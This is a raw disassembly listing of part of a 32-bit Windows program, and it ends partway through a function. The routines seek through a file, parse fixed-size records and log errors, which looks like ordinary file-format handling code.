  40393e:	c3                   	ret
  40393f:	cc                   	int3
  403940:	83 ec 08             	sub    $0x8,%esp
  403943:	53                   	push   %ebx
  403944:	55                   	push   %ebp
  403945:	56                   	push   %esi
  403946:	57                   	push   %edi
  403947:	68 d8 8c 00 00       	push   $0x8cd8
  40394c:	e8 a0 72 00 00       	call   0x40abf1
  403951:	8b f0                	mov    %eax,%esi
  403953:	33 ff                	xor    %edi,%edi
  403955:	83 c4 04             	add    $0x4,%esp
  403958:	3b f7                	cmp    %edi,%esi
  40395a:	75 2b                	jne    0x403987
  40395c:	6a 08                	push   $0x8
  40395e:	ff 15 a8 80 41 00    	call   *0x4180a8
  403964:	68 dc a8 41 00       	push   $0x41a8dc
  403969:	68 b9 04 00 00       	push   $0x4b9
  40396e:	68 70 aa 41 00       	push   $0x41aa70
  403973:	33 d2                	xor    %edx,%edx
  403975:	e8 96 28 00 00       	call   0x406210
  40397a:	83 c4 0c             	add    $0xc,%esp
  40397d:	33 c0                	xor    %eax,%eax
  40397f:	5f                   	pop    %edi
  403980:	5e                   	pop    %esi
  403981:	5d                   	pop    %ebp
  403982:	5b                   	pop    %ebx
  403983:	83 c4 08             	add    $0x8,%esp
  403986:	c3                   	ret
  403987:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  40398b:	8d 56 04             	lea    0x4(%esi),%edx
  40398e:	8d 86 cc 0c 00 00    	lea    0xccc(%esi),%eax
  403994:	52                   	push   %edx
  403995:	89 0e                	mov    %ecx,(%esi)
  403997:	89 be c4 00 00 00    	mov    %edi,0xc4(%esi)
  40399d:	89 be c8 00 00 00    	mov    %edi,0xc8(%esi)
  4039a3:	e8 88 f0 ff ff       	call   0x402a30
  4039a8:	83 c4 04             	add    $0x4,%esp
  4039ab:	85 c0                	test   %eax,%eax
  4039ad:	0f 84 43 01 00 00    	je     0x403af6
  4039b3:	8b 46 10             	mov    0x10(%esi),%eax
  4039b6:	3b c7                	cmp    %edi,%eax
  4039b8:	0f 84 4b 01 00 00    	je     0x403b09
  4039be:	39 7e 18             	cmp    %edi,0x18(%esi)
  4039c1:	0f 84 42 01 00 00    	je     0x403b09
  4039c7:	33 ed                	xor    %ebp,%ebp
  4039c9:	81 be c4 00 00 00 00 	cmpl   $0x100,0xc4(%esi)
  4039d0:	01 00 00 
  4039d3:	89 44 24 10          	mov    %eax,0x10(%esp)
  4039d7:	89 7c 24 14          	mov    %edi,0x14(%esp)
  4039db:	8d 9e cc 00 00 00    	lea    0xcc(%esi),%ebx
  4039e1:	0f 83 b1 00 00 00    	jae    0x403a98
  4039e7:	eb 09                	jmp    0x4039f2
  4039e9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4039f0:	33 ff                	xor    %edi,%edi
  4039f2:	8b 44 24 14          	mov    0x14(%esp),%eax
  4039f6:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4039fa:	57                   	push   %edi
  4039fb:	8b 7c 24 20          	mov    0x20(%esp),%edi
  4039ff:	6a 01                	push   $0x1
  403a01:	50                   	push   %eax
  403a02:	51                   	push   %ecx
  403a03:	8d 8e cc 0c 00 00    	lea    0xccc(%esi),%ecx
  403a09:	e8 c2 f6 ff ff       	call   0x4030d0
  403a0e:	83 c4 10             	add    $0x10,%esp
  403a11:	85 c0                	test   %eax,%eax
  403a13:	0f 84 dd 00 00 00    	je     0x403af6
  403a19:	89 2b                	mov    %ebp,(%ebx)
  403a1b:	8b 96 cc 0c 00 00    	mov    0xccc(%esi),%edx
  403a21:	89 53 04             	mov    %edx,0x4(%ebx)
  403a24:	66 8b 86 d2 0c 00 00 	mov    0xcd2(%esi),%ax
  403a2b:	66 89 43 08          	mov    %ax,0x8(%ebx)
  403a2f:	81 be c8 00 00 00 ff 	cmpl   $0xffff,0xc8(%esi)
  403a36:	ff 00 00 
  403a39:	0f 87 8f 00 00 00    	ja     0x403ace
  403a3f:	66 8b 8e c8 00 00 00 	mov    0xc8(%esi),%cx
  403a46:	66 89 4b 0a          	mov    %cx,0xa(%ebx)
  403a4a:	ba 01 00 00 00       	mov    $0x1,%edx
  403a4f:	01 96 c8 00 00 00    	add    %edx,0xc8(%esi)
  403a55:	8b 86 cc 0c 00 00    	mov    0xccc(%esi),%eax
  403a5b:	83 c0 07             	add    $0x7,%eax
  403a5e:	c1 e8 03             	shr    $0x3,%eax
  403a61:	03 c0                	add    %eax,%eax
  403a63:	03 c0                	add    %eax,%eax
  403a65:	03 c0                	add    %eax,%eax
  403a67:	01 44 24 10          	add    %eax,0x10(%esp)
  403a6b:	83 54 24 14 00       	adcl   $0x0,0x14(%esp)
  403a70:	01 96 c4 00 00 00    	add    %edx,0xc4(%esi)
  403a76:	03 e8                	add    %eax,%ebp
  403a78:	8b 46 18             	mov    0x18(%esi),%eax
  403a7b:	83 c3 0c             	add    $0xc,%ebx
  403a7e:	3b e8                	cmp    %eax,%ebp
  403a80:	0f 84 89 00 00 00    	je     0x403b0f
  403a86:	77 57                	ja     0x403adf
  403a88:	81 be c4 00 00 00 00 	cmpl   $0x100,0xc4(%esi)
  403a8f:	01 00 00 
  403a92:	0f 82 58 ff ff ff    	jb     0x4039f0
  403a98:	8b 96 c4 00 00 00    	mov    0xc4(%esi),%edx
  403a9e:	52                   	push   %edx
  403a9f:	68 98 ab 41 00       	push   $0x41ab98
  403aa4:	68 cc 04 00 00       	push   $0x4cc
  403aa9:	68 70 aa 41 00       	push   $0x41aa70
  403aae:	ba 10 00 00 00       	mov    $0x10,%edx
  403ab3:	e8 88 28 00 00       	call   0x406340
  403ab8:	83 c4 10             	add    $0x10,%esp
  403abb:	56                   	push   %esi
  403abc:	e8 53 70 00 00       	call   0x40ab14
  403ac1:	83 c4 04             	add    $0x4,%esp
  403ac4:	33 c0                	xor    %eax,%eax
  403ac6:	5f                   	pop    %edi
  403ac7:	5e                   	pop    %esi
  403ac8:	5d                   	pop    %ebp
  403ac9:	5b                   	pop    %ebx
  403aca:	83 c4 08             	add    $0x8,%esp
  403acd:	c3                   	ret
  403ace:	68 ff ff 00 00       	push   $0xffff
  403ad3:	68 c0 ab 41 00       	push   $0x41abc0
  403ad8:	68 d3 04 00 00       	push   $0x4d3
  403add:	eb ca                	jmp    0x403aa9
  403adf:	68 e8 ab 41 00       	push   $0x41abe8
  403ae4:	68 de 04 00 00       	push   $0x4de
  403ae9:	68 70 aa 41 00       	push   $0x41aa70
  403aee:	e8 4d 28 00 00       	call   0x406340
  403af3:	83 c4 0c             	add    $0xc,%esp
  403af6:	56                   	push   %esi
  403af7:	e8 18 70 00 00       	call   0x40ab14
  403afc:	83 c4 04             	add    $0x4,%esp
  403aff:	33 c0                	xor    %eax,%eax
  403b01:	5f                   	pop    %edi
  403b02:	5e                   	pop    %esi
  403b03:	5d                   	pop    %ebp
  403b04:	5b                   	pop    %ebx
  403b05:	83 c4 08             	add    $0x8,%esp
  403b08:	c3                   	ret
  403b09:	89 7e 10             	mov    %edi,0x10(%esi)
  403b0c:	89 7e 18             	mov    %edi,0x18(%esi)
  403b0f:	5f                   	pop    %edi
  403b10:	8b c6                	mov    %esi,%eax
  403b12:	5e                   	pop    %esi
  403b13:	5d                   	pop    %ebp
  403b14:	5b                   	pop    %ebx
  403b15:	83 c4 08             	add    $0x8,%esp
  403b18:	c3                   	ret
  403b19:	cc                   	int3
  403b1a:	cc                   	int3
  403b1b:	cc                   	int3
  403b1c:	cc                   	int3
  403b1d:	cc                   	int3
  403b1e:	cc                   	int3
  403b1f:	cc                   	int3
  403b20:	55                   	push   %ebp
  403b21:	57                   	push   %edi
  403b22:	8b b8 c4 00 00 00    	mov    0xc4(%eax),%edi
  403b28:	33 c9                	xor    %ecx,%ecx
  403b2a:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  403b30:	85 ff                	test   %edi,%edi
  403b32:	76 26                	jbe    0x403b5a
  403b34:	8d 90 d6 00 00 00    	lea    0xd6(%eax),%edx
  403b3a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  403b40:	8b 06                	mov    (%esi),%eax
  403b42:	3d 00 01 00 00       	cmp    $0x100,%eax
  403b47:	74 19                	je     0x403b62
  403b49:	0f b7 2a             	movzwl (%edx),%ebp
  403b4c:	89 2c 83             	mov    %ebp,(%ebx,%eax,4)
  403b4f:	40                   	inc    %eax
  403b50:	41                   	inc    %ecx
  403b51:	83 c2 0c             	add    $0xc,%edx
  403b54:	89 06                	mov    %eax,(%esi)
  403b56:	3b cf                	cmp    %edi,%ecx
  403b58:	72 e6                	jb     0x403b40
  403b5a:	5f                   	pop    %edi
  403b5b:	b8 01 00 00 00       	mov    $0x1,%eax
  403b60:	5d                   	pop    %ebp
  403b61:	c3                   	ret
  403b62:	68 00 01 00 00       	push   $0x100
  403b67:	68 20 ac 41 00       	push   $0x41ac20
  403b6c:	68 36 05 00 00       	push   $0x536
  403b71:	68 70 aa 41 00       	push   $0x41aa70
  403b76:	ba 0e 00 00 00       	mov    $0xe,%edx
  403b7b:	e8 c0 27 00 00       	call   0x406340
  403b80:	83 c4 10             	add    $0x10,%esp
  403b83:	5f                   	pop    %edi
  403b84:	33 c0                	xor    %eax,%eax
  403b86:	5d                   	pop    %ebp
  403b87:	c3                   	ret
  403b88:	cc                   	int3
  403b89:	cc                   	int3
  403b8a:	cc                   	int3
  403b8b:	cc                   	int3
  403b8c:	cc                   	int3
  403b8d:	cc                   	int3
  403b8e:	cc                   	int3
  403b8f:	cc                   	int3
  403b90:	83 ec 08             	sub    $0x8,%esp
  403b93:	53                   	push   %ebx
  403b94:	55                   	push   %ebp
  403b95:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  403b99:	8b 8d c4 00 00 00    	mov    0xc4(%ebp),%ecx
  403b9f:	56                   	push   %esi
  403ba0:	8b f0                	mov    %eax,%esi
  403ba2:	33 c0                	xor    %eax,%eax
  403ba4:	57                   	push   %edi
  403ba5:	85 c9                	test   %ecx,%ecx
  403ba7:	76 16                	jbe    0x403bbf
  403ba9:	8d 95 d6 00 00 00    	lea    0xd6(%ebp),%edx
  403baf:	90                   	nop
  403bb0:	0f b7 3a             	movzwl (%edx),%edi
  403bb3:	3b fe                	cmp    %esi,%edi
  403bb5:	74 08                	je     0x403bbf
  403bb7:	40                   	inc    %eax
  403bb8:	83 c2 0c             	add    $0xc,%edx
  403bbb:	3b c1                	cmp    %ecx,%eax
  403bbd:	72 f1                	jb     0x403bb0
  403bbf:	3b c1                	cmp    %ecx,%eax
  403bc1:	75 26                	jne    0x403be9
  403bc3:	68 3c ac 41 00       	push   $0x41ac3c
  403bc8:	68 52 05 00 00       	push   $0x552
  403bcd:	68 70 aa 41 00       	push   $0x41aa70
  403bd2:	ba 02 00 00 00       	mov    $0x2,%edx
  403bd7:	e8 64 27 00 00       	call   0x406340
  403bdc:	83 c4 0c             	add    $0xc,%esp
  403bdf:	33 c0                	xor    %eax,%eax
  403be1:	5f                   	pop    %edi
  403be2:	5e                   	pop    %esi
  403be3:	5d                   	pop    %ebp
  403be4:	5b                   	pop    %ebx
  403be5:	83 c4 08             	add    $0x8,%esp
  403be8:	c3                   	ret
  403be9:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  403bed:	8b 11                	mov    (%ecx),%edx
  403bef:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403bf3:	8b 7d 00             	mov    0x0(%ebp),%edi
  403bf6:	8d 04 40             	lea    (%eax,%eax,2),%eax
  403bf9:	8b 9c 85 cc 00 00 00 	mov    0xcc(%ebp,%eax,4),%ebx
  403c00:	03 5d 10             	add    0x10(%ebp),%ebx
  403c03:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403c07:	50                   	push   %eax
  403c08:	33 f6                	xor    %esi,%esi
  403c0a:	56                   	push   %esi
  403c0b:	56                   	push   %esi
  403c0c:	53                   	push   %ebx
  403c0d:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  403c11:	e8 ba f4 ff ff       	call   0x4030d0
  403c16:	83 c4 10             	add    $0x10,%esp
  403c19:	85 c0                	test   %eax,%eax
  403c1b:	74 c2                	je     0x403bdf
  403c1d:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403c21:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  403c25:	03 d8                	add    %eax,%ebx
  403c27:	13 f6                	adc    %esi,%esi
  403c29:	89 74 24 14          	mov    %esi,0x14(%esp)
  403c2d:	8b f3                	mov    %ebx,%esi
  403c2f:	f7 de                	neg    %esi
  403c31:	83 e6 07             	and    $0x7,%esi
  403c34:	89 01                	mov    %eax,(%ecx)
  403c36:	89 b5 d4 8c 00 00    	mov    %esi,0x8cd4(%ebp)
  403c3c:	76 50                	jbe    0x403c8e
  403c3e:	8b 54 24 14          	mov    0x14(%esp),%edx
  403c42:	8b 7d 00             	mov    0x0(%ebp),%edi
  403c45:	6a 00                	push   $0x0
  403c47:	6a 00                	push   $0x0
  403c49:	52                   	push   %edx
  403c4a:	53                   	push   %ebx
  403c4b:	57                   	push   %edi
  403c4c:	ff 15 88 80 41 00    	call   *0x418088
  403c52:	85 c0                	test   %eax,%eax
  403c54:	75 23                	jne    0x403c79
  403c56:	68 44 aa 41 00       	push   $0x41aa44
  403c5b:	68 f9 00 00 00       	push   $0xf9
  403c60:	68 70 aa 41 00       	push   $0x41aa70
  403c65:	33 d2                	xor    %edx,%edx
  403c67:	e8 a4 25 00 00       	call   0x406210
  403c6c:	83 c4 0c             	add    $0xc,%esp
  403c6f:	33 c0                	xor    %eax,%eax
  403c71:	5f                   	pop    %edi
  403c72:	5e                   	pop    %esi
  403c73:	5d                   	pop    %ebp
  403c74:	5b                   	pop    %ebx
  403c75:	83 c4 08             	add    $0x8,%esp
  403c78:	c3                   	ret
  403c79:	8d 8d cc 8c 00 00    	lea    0x8ccc(%ebp),%ecx
  403c7f:	8b d7                	mov    %edi,%edx
  403c81:	e8 ca ea ff ff       	call   0x402750
  403c86:	85 c0                	test   %eax,%eax
  403c88:	0f 84 51 ff ff ff    	je     0x403bdf
  403c8e:	8b 44 24 24          	mov    0x24(%esp),%eax
  403c92:	01 30                	add    %esi,(%eax)
  403c94:	5f                   	pop    %edi
  403c95:	5e                   	pop    %esi
  403c96:	5d                   	pop    %ebp
  403c97:	b8 01 00 00 00       	mov    $0x1,%eax
  403c9c:	5b                   	pop    %ebx
  403c9d:	83 c4 08             	add    $0x8,%esp
  403ca0:	c3                   	ret
  403ca1:	cc                   	int3
  403ca2:	cc                   	int3
  403ca3:	cc                   	int3
  403ca4:	cc                   	int3
  403ca5:	cc                   	int3
  403ca6:	cc                   	int3
  403ca7:	cc                   	int3
  403ca8:	cc                   	int3
  403ca9:	cc                   	int3
  403caa:	cc                   	int3
  403cab:	cc                   	int3
  403cac:	cc                   	int3
  403cad:	cc                   	int3
  403cae:	cc                   	int3
  403caf:	cc                   	int3
  403cb0:	83 ec 08             	sub    $0x8,%esp
  403cb3:	53                   	push   %ebx
  403cb4:	55                   	push   %ebp
  403cb5:	56                   	push   %esi
  403cb6:	57                   	push   %edi
  403cb7:	8b f0                	mov    %eax,%esi
  403cb9:	8b 06                	mov    (%esi),%eax
  403cbb:	8b 7e 18             	mov    0x18(%esi),%edi
  403cbe:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  403cc2:	51                   	push   %ecx
  403cc3:	33 ed                	xor    %ebp,%ebp
  403cc5:	50                   	push   %eax
  403cc6:	33 db                	xor    %ebx,%ebx
  403cc8:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  403ccc:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  403cd0:	ff 15 94 80 41 00    	call   *0x418094
  403cd6:	33 d2                	xor    %edx,%edx
  403cd8:	85 c0                	test   %eax,%eax
  403cda:	75 21                	jne    0x403cfd
  403cdc:	68 bc aa 41 00       	push   $0x41aabc
  403ce1:	68 1e 01 00 00       	push   $0x11e
  403ce6:	68 70 aa 41 00       	push   $0x41aa70
  403ceb:	e8 20 25 00 00       	call   0x406210
  403cf0:	83 c4 0c             	add    $0xc,%esp
  403cf3:	8b c3                	mov    %ebx,%eax
  403cf5:	5f                   	pop    %edi
  403cf6:	5e                   	pop    %esi
  403cf7:	5d                   	pop    %ebp
  403cf8:	5b                   	pop    %ebx
  403cf9:	83 c4 08             	add    $0x8,%esp
  403cfc:	c3                   	ret
  403cfd:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  403d01:	8b 8e b4 00 00 00    	mov    0xb4(%esi),%ecx
  403d07:	2b df                	sub    %edi,%ebx
  403d09:	8b 7c 24 14          	mov    0x14(%esp),%edi
  403d0d:	1b fa                	sbb    %edx,%edi
  403d0f:	81 eb 98 02 00 00    	sub    $0x298,%ebx
  403d15:	1b fd                	sbb    %ebp,%edi
  403d17:	33 c0                	xor    %eax,%eax
  403d19:	3b f8                	cmp    %eax,%edi
  403d1b:	7c 77                	jl     0x403d94
  403d1d:	7f 04                	jg     0x403d23
  403d1f:	3b d9                	cmp    %ecx,%ebx
  403d21:	72 71                	jb     0x403d94
  403d23:	8b 2e                	mov    (%esi),%ebp
  403d25:	6a 00                	push   $0x0
  403d27:	6a 00                	push   $0x0
  403d29:	57                   	push   %edi
  403d2a:	53                   	push   %ebx
  403d2b:	55                   	push   %ebp
  403d2c:	ff 15 88 80 41 00    	call   *0x418088
  403d32:	85 c0                	test   %eax,%eax
  403d34:	75 23                	jne    0x403d59
  403d36:	68 44 aa 41 00       	push   $0x41aa44
  403d3b:	68 f9 00 00 00       	push   $0xf9
  403d40:	68 70 aa 41 00       	push   $0x41aa70
  403d45:	33 d2                	xor    %edx,%edx
  403d47:	e8 c4 24 00 00       	call   0x406210
  403d4c:	83 c4 0c             	add    $0xc,%esp
  403d4f:	33 c0                	xor    %eax,%eax
  403d51:	5f                   	pop    %edi
  403d52:	5e                   	pop    %esi
  403d53:	5d                   	pop    %ebp
  403d54:	5b                   	pop    %ebx
  403d55:	83 c4 08             	add    $0x8,%esp
  403d58:	c3                   	ret
  403d59:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403d5d:	be 98 02 00 00       	mov    $0x298,%esi
  403d62:	8b d5                	mov    %ebp,%edx
  403d64:	e8 e7 e9 ff ff       	call   0x402750
  403d69:	85 c0                	test   %eax,%eax
  403d6b:	74 e2                	je     0x403d4f
  403d6d:	8b 44 24 20          	mov    0x20(%esp),%eax
  403d71:	85 c0                	test   %eax,%eax
  403d73:	74 05                	je     0x403d7a
  403d75:	89 18                	mov    %ebx,(%eax)
  403d77:	89 78 04             	mov    %edi,0x4(%eax)
  403d7a:	8b 44 24 24          	mov    0x24(%esp),%eax
  403d7e:	85 c0                	test   %eax,%eax
  403d80:	74 1f                	je     0x403da1
  403d82:	b9 01 00 00 00       	mov    $0x1,%ecx
  403d87:	66 89 08             	mov    %cx,(%eax)
  403d8a:	8b c1                	mov    %ecx,%eax
  403d8c:	5f                   	pop    %edi
  403d8d:	5e                   	pop    %esi
  403d8e:	5d                   	pop    %ebp
  403d8f:	5b                   	pop    %ebx
  403d90:	83 c4 08             	add    $0x8,%esp
  403d93:	c3                   	ret
  403d94:	8b 44 24 24          	mov    0x24(%esp),%eax
  403d98:	3b c5                	cmp    %ebp,%eax
  403d9a:	74 05                	je     0x403da1
  403d9c:	33 d2                	xor    %edx,%edx
  403d9e:	66 89 10             	mov    %dx,(%eax)
  403da1:	5f                   	pop    %edi
  403da2:	5e                   	pop    %esi
  403da3:	5d                   	pop    %ebp
  403da4:	b8 01 00 00 00       	mov    $0x1,%eax
  403da9:	5b                   	pop    %ebx
  403daa:	83 c4 08             	add    $0x8,%esp
  403dad:	c3                   	ret
  403dae:	cc                   	int3
  403daf:	cc                   	int3
  403db0:	51                   	push   %ecx
  403db1:	8b 8a c4 00 00 00    	mov    0xc4(%edx),%ecx
  403db7:	53                   	push   %ebx
  403db8:	56                   	push   %esi
  403db9:	57                   	push   %edi
  403dba:	8b f8                	mov    %eax,%edi
  403dbc:	33 c0                	xor    %eax,%eax
  403dbe:	85 c9                	test   %ecx,%ecx
  403dc0:	76 15                	jbe    0x403dd7
  403dc2:	8d b2 d6 00 00 00    	lea    0xd6(%edx),%esi
  403dc8:	0f b7 1e             	movzwl (%esi),%ebx
  403dcb:	3b df                	cmp    %edi,%ebx
  403dcd:	74 08                	je     0x403dd7
  403dcf:	40                   	inc    %eax
  403dd0:	83 c6 0c             	add    $0xc,%esi
  403dd3:	3b c1                	cmp    %ecx,%eax
  403dd5:	72 f1                	jb     0x403dc8
  403dd7:	3b c1                	cmp    %ecx,%eax
  403dd9:	75 23                	jne    0x403dfe
  403ddb:	68 54 ac 41 00       	push   $0x41ac54
  403de0:	68 a7 05 00 00       	push   $0x5a7
  403de5:	68 70 aa 41 00       	push   $0x41aa70
  403dea:	ba 02 00 00 00       	mov    $0x2,%edx
  403def:	e8 4c 25 00 00       	call   0x406340
  403df4:	83 c4 0c             	add    $0xc,%esp
  403df7:	33 c0                	xor    %eax,%eax
  403df9:	5f                   	pop    %edi
  403dfa:	5e                   	pop    %esi
  403dfb:	5b                   	pop    %ebx
  403dfc:	59                   	pop    %ecx
  403dfd:	c3                   	ret
  403dfe:	8b 3a                	mov    (%edx),%edi
  403e00:	33 c9                	xor    %ecx,%ecx
  403e02:	51                   	push   %ecx
  403e03:	8d 04 40             	lea    (%eax,%eax,2),%eax
  403e06:	8b 84 82 cc 00 00 00 	mov    0xcc(%edx,%eax,4),%eax
  403e0d:	03 42 10             	add    0x10(%edx),%eax
  403e10:	6a 01                	push   $0x1
  403e12:	51                   	push   %ecx
  403e13:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403e17:	50                   	push   %eax
  403e18:	e8 b3 f2 ff ff       	call   0x4030d0
  403e1d:	83 c4 10             	add    $0x10,%esp
  403e20:	85 c0                	test   %eax,%eax
  403e22:	75 05                	jne    0x403e29
  403e24:	5f                   	pop    %edi
  403e25:	5e                   	pop    %esi
  403e26:	5b                   	pop    %ebx
  403e27:	59                   	pop    %ecx
  403e28:	c3                   	ret
  403e29:	5f                   	pop    %edi
  403e2a:	5e                   	pop    %esi
  403e2b:	b8 01 00 00 00       	mov    $0x1,%eax
  403e30:	5b                   	pop    %ebx
  403e31:	59                   	pop    %ecx
  403e32:	c3                   	ret
  403e33:	cc                   	int3
  403e34:	cc                   	int3
  403e35:	cc                   	int3
  403e36:	cc                   	int3
  403e37:	cc                   	int3
  403e38:	cc                   	int3
  403e39:	cc                   	int3
  403e3a:	cc                   	int3
  403e3b:	cc                   	int3
  403e3c:	cc                   	int3
  403e3d:	cc                   	int3
  403e3e:	cc                   	int3
  403e3f:	cc                   	int3
  403e40:	83 ec 1c             	sub    $0x1c,%esp
  403e43:	53                   	push   %ebx
  403e44:	55                   	push   %ebp
  403e45:	33 db                	xor    %ebx,%ebx
  403e47:	56                   	push   %esi
  403e48:	57                   	push   %edi
  403e49:	8b f9                	mov    %ecx,%edi
  403e4b:	8b 6f 04             	mov    0x4(%edi),%ebp
  403e4e:	8b 97 c4 00 00 00    	mov    0xc4(%edi),%edx
  403e54:	8d b7 cc 0c 00 00    	lea    0xccc(%edi),%esi
  403e5a:	89 2e                	mov    %ebp,(%esi)
  403e5c:	89 5e 04             	mov    %ebx,0x4(%esi)
  403e5f:	c7 46 08 04 00 00 00 	movl   $0x4,0x8(%esi)
  403e66:	89 5e 0c             	mov    %ebx,0xc(%esi)
  403e69:	c7 46 10 01 00 00 00 	movl   $0x1,0x10(%esi)
  403e70:	8b 6f 08             	mov    0x8(%edi),%ebp
  403e73:	89 6e 18             	mov    %ebp,0x18(%esi)
  403e76:	89 5e 1c             	mov    %ebx,0x1c(%esi)
  403e79:	c7 46 20 08 00 00 00 	movl   $0x8,0x20(%esi)
  403e80:	89 5e 24             	mov    %ebx,0x24(%esi)
  403e83:	89 5e 28             	mov    %ebx,0x28(%esi)
  403e86:	bd 02 00 00 00       	mov    $0x2,%ebp
  403e8b:	8d 8f cc 00 00 00    	lea    0xcc(%edi),%ecx
  403e91:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  403e95:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  403e99:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  403e9d:	89 9f b8 00 00 00    	mov    %ebx,0xb8(%edi)
  403ea3:	89 9f bc 00 00 00    	mov    %ebx,0xbc(%edi)
  403ea9:	89 9f c0 00 00 00    	mov    %ebx,0xc0(%edi)
  403eaf:	3b c3                	cmp    %ebx,%eax
  403eb1:	74 09                	je     0x403ebc
  403eb3:	8b 57 14             	mov    0x14(%edi),%edx
  403eb6:	89 10                	mov    %edx,(%eax)
  403eb8:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  403ebc:	39 5c 24 34          	cmp    %ebx,0x34(%esp)
  403ec0:	74 08                	je     0x403eca
  403ec2:	c7 44 24 18 80 38 40 	movl   $0x403880,0x18(%esp)
  403ec9:	00 
  403eca:	8b 47 10             	mov    0x10(%edi),%eax
  403ecd:	89 44 24 20          	mov    %eax,0x20(%esp)
  403ed1:	3b d3                	cmp    %ebx,%edx
  403ed3:	76 57                	jbe    0x403f2c
  403ed5:	8d 46 3c             	lea    0x3c(%esi),%eax
  403ed8:	89 54 24 14          	mov    %edx,0x14(%esp)
  403edc:	8d 64 24 00          	lea    0x0(%esp),%esp
  403ee0:	ba 00 f0 00 00       	mov    $0xf000,%edx
  403ee5:	66 39 51 08          	cmp    %dx,0x8(%ecx)
  403ee9:	75 37                	jne    0x403f22
  403eeb:	8b 19                	mov    (%ecx),%ebx
  403eed:	33 ed                	xor    %ebp,%ebp
  403eef:	03 5c 24 20          	add    0x20(%esp),%ebx
  403ef3:	8b d5                	mov    %ebp,%edx
  403ef5:	13 ea                	adc    %edx,%ebp
  403ef7:	89 68 f8             	mov    %ebp,-0x8(%eax)
  403efa:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  403efe:	89 58 f4             	mov    %ebx,-0xc(%eax)
  403f01:	8b 51 04             	mov    0x4(%ecx),%edx
  403f04:	83 c2 07             	add    $0x7,%edx
  403f07:	c1 ea 03             	shr    $0x3,%edx
  403f0a:	03 d2                	add    %edx,%edx
  403f0c:	03 d2                	add    %edx,%edx
  403f0e:	33 db                	xor    %ebx,%ebx
  403f10:	03 d2                	add    %edx,%edx
  403f12:	45                   	inc    %ebp
  403f13:	89 50 fc             	mov    %edx,-0x4(%eax)
  403f16:	89 18                	mov    %ebx,(%eax)
  403f18:	89 58 04             	mov    %ebx,0x4(%eax)
  403f1b:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  403f1f:	83 c0 18             	add    $0x18,%eax
  403f22:	83 c1 0c             	add    $0xc,%ecx
  403f25:	83 6c 24 14 01       	subl   $0x1,0x14(%esp)
  403f2a:	75 b4                	jne    0x403ee0
  403f2c:	8d 44 6d 00          	lea    0x0(%ebp,%ebp,2),%eax
  403f30:	03 c0                	add    %eax,%eax
  403f32:	03 c0                	add    %eax,%eax
  403f34:	03 c0                	add    %eax,%eax
  403f36:	50                   	push   %eax
  403f37:	89 44 24 14          	mov    %eax,0x14(%esp)
  403f3b:	e8 b1 6c 00 00       	call   0x40abf1
  403f40:	83 c4 04             	add    $0x4,%esp
  403f43:	89 44 24 14          	mov    %eax,0x14(%esp)
  403f47:	3b c3                	cmp    %ebx,%eax
  403f49:	75 2b                	jne    0x403f76
  403f4b:	6a 08                	push   $0x8
  403f4d:	ff 15 a8 80 41 00    	call   *0x4180a8
  403f53:	68 dc a8 41 00       	push   $0x41a8dc
  403f58:	68 ee 05 00 00       	push   $0x5ee
  403f5d:	68 70 aa 41 00       	push   $0x41aa70
  403f62:	33 d2                	xor    %edx,%edx
  403f64:	e8 a7 22 00 00       	call   0x406210
  403f69:	83 c4 0c             	add    $0xc,%esp
  403f6c:	33 c0                	xor    %eax,%eax
  403f6e:	5f                   	pop    %edi
  403f6f:	5e                   	pop    %esi
  403f70:	5d                   	pop    %ebp
  403f71:	5b                   	pop    %ebx
  403f72:	83 c4 1c             	add    $0x1c,%esp
  403f75:	c3                   	ret
  403f76:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403f7a:	51                   	push   %ecx
  403f7b:	56                   	push   %esi
  403f7c:	50                   	push   %eax
  403f7d:	e8 ce 5c 00 00       	call   0x409c50
  403f82:	8b 44 24 24          	mov    0x24(%esp),%eax
  403f86:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  403f8a:	83 c4 0c             	add    $0xc,%esp
  403f8d:	8d 54 24 20          	lea    0x20(%esp),%edx
  403f91:	52                   	push   %edx
  403f92:	57                   	push   %edi
  403f93:	50                   	push   %eax
  403f94:	51                   	push   %ecx
  403f95:	68 f0 1b 40 00       	push   $0x401bf0
  403f9a:	55                   	push   %ebp
  403f9b:	8b 6c 24 2c          	mov    0x2c(%esp),%ebp
  403f9f:	55                   	push   %ebp
  403fa0:	8b c7                	mov    %edi,%eax
  403fa2:	e8 a9 f2 ff ff       	call   0x403250
  403fa7:	83 c4 1c             	add    $0x1c,%esp
  403faa:	85 c0                	test   %eax,%eax
  403fac:	75 13                	jne    0x403fc1
  403fae:	55                   	push   %ebp
  403faf:	e8 60 6b 00 00       	call   0x40ab14
  403fb4:	83 c4 04             	add    $0x4,%esp
  403fb7:	33 c0                	xor    %eax,%eax
  403fb9:	5f                   	pop    %edi
  403fba:	5e                   	pop    %esi
  403fbb:	5d                   	pop    %ebp
  403fbc:	5b                   	pop    %ebx
  403fbd:	83 c4 1c             	add    $0x1c,%esp
  403fc0:	c3                   	ret
  403fc1:	39 5c 24 1c          	cmp    %ebx,0x1c(%esp)
  403fc5:	75 3f                	jne    0x404006
  403fc7:	8b 54 24 20          	mov    0x20(%esp),%edx
  403fcb:	8b 44 24 24          	mov    0x24(%esp),%eax
